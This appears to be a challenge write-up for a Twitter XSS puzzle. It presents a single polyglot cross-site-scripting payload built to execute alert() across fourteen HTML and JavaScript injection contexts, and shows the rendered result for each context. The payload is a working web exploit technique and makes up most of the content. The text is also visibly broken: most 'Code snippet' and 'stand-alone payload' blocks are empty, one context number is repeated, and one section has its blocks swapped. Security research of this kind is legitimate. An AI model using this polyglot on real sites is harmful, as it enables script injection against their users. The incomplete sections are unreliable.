---
layout: single
title: 21 Vector to Rule Them All XSSmas Challenge
date: 2021-12-06
classes: wide
tags:
  - Twitter
  - XSS
  - XSSmas
  - Challenge
  - Frederik Braun
---

Can you create the shortest XSS vector that triggers in all contexts?

![twitter challenge](/assets/images/twitter/freddyb/twitter-challenge.png)

## Overview

To start off, here is the challenge page with the official rules.

![challenge page](/assets/images/twitter/freddyb/challenge-page.png)

Let's count how many contexts are there on the page

![number-of-contexts](/assets//images/twitter/freddyb/number-of-contexts.png)

## TL;DR Solution

```
"%0Ax=//`//</style></title></math></select></template></textarea><svg+x=*/%0Aonload=alert()//></svg>
```

## Detailed Solution

### Context #3: Double quotes string

- Code snippet

```html
<script>
    injection = "payload";
</script>
```

- Result of stand-alone payload `"%0Aalert()//`

```html
<script>
    injection = ""
alert()//";
</script>
```

- Polyglot result

```html
<script>
    injection = ""
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;";
</script>
```

### Context #2: Template string

- Code snippet

```html
<script>
    injection = `payload`;
</script>
```

- Result of stand-alone payload `` `%0Aalert()// ``

```html
<script>
    injection = ``
alert()//`;
</script>
```

- Polyglot result

```html
<script>
    injection = `"
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;`;
</script>
```

### Context #3: Single-line comment

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<script>
    // "
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;
</script>
```

### Context #4: Multi-line comment 

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<script>
    /* "
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt; */
</script>
```

### Context #5: HTML Stylesheet

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<style>
* {  /* REDACTED */ }
"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></style>
```

### Context #6: HTML Title

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<title>2021's vector to rule them all - "
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></title></head>
```

### Context #7: HTML Main Element

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<main>    "
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg>
    <select>
```

### Context #8: HTML Select Element

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<select><option>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></option></select>
```

### Context #9: HTML Textarea

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<textarea>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></textarea>
```

### Context #10: HTML Image

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<img src=""
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg>" alt="" />
```

### Context #11: HTML Template

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
 <template>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></template>
```

- Polyglot result

```html
```

### Context #12: HTML SVG

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<svg>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></svg>
```

### Context #13: HTML Math Element

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<math>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></math>
```

### Context #14: HTML iFrame

- Code snippet

```html
```

- Result of stand-alone payload ``

```html
```

- Polyglot result

```html
<iframe data-injection=""
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;" src="data:text/html,<h1>Ignore me"></iframe>
</main>
```